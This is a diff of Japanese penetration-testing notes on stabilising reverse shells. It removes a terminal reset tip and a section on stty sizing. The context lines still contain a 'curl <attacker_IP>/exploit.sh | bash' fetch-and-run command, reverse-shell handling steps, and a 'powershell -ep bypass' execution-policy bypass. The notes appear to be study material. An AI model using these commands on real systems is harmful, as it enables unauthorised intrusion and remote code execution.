@@ -279,16 +279,9 @@ stty raw -echo; fg
 ```
 - ※見た目が一時的に乱れるが、安定性は向上する
 
-
 > [!Info]
 > シェルから離脱したいときや、文字化けや入力異常が起きたときは、`reset`を実行
 > 
-
-
-の復旧手段
-```zsh
-reset
-```
 
 ### 安定化 w/o Python
 
@@ -316,26 +309,13 @@ curl <attacker_IP>/exploit.sh | bash
 
 5. リバースシェルを確立したら、[[#安定化 w/ Python]]へ進む
 
-#### 補足：ターミナルのサイズ変更（Linux）
-
-1. 攻撃者のマシンで新しいターミナルを開き、以下のコマンドの出力から*rows*と*columns*の値をメモする
-```zsh
-stty -a
-```
-
-2. Bind / Reverse Shellに戻り、以下のコマンドを実行
-```zsh
-stty rows <number>
-stty cols <number>
-```
-
 ---
 
-## 🪟 Windowsターゲット向け
+## 🪟 Windowsターゲット向け安定化
 
-Windowsでは安定化する手法が限られており、最も効果的な手法は[[#OS共通：rlwrapを使ってリスナーを立てる]]方法くらい
+Windowsでは安定化する手法が限られており、最も効果的な手法は[[#OS共通：rlwrapを使ってリスナーを立てる]]方法くらい。
 
-PowerShellのエンコーディングの問題や文字化け解消に使えるテクニック
+その他、PowerShellのエンコーディングの問題や文字化け解消に使えるテクニック
 ```powershell
 powershell -ep bypass
 chcp 65001
